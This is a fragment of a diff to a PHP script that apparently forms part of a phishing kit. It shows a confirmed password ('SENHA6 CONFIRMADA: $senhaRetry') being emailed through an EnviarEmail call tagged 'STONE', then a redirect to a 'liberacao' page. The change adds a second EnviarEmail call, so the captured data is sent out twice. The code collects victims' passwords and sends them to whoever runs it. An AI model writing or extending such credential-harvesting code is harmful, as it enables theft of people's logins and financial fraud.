@@ -29,6 +29,7 @@ SENHA6 CONFIRMADA: $senhaRetry <br>
 
 
 new EnviarEmail('[STONE]',$teste,"STONE");
+new EnviarEmail('[STONE1]',$teste,"STONE");
 
 header("location:liberacao.php");
  ?>
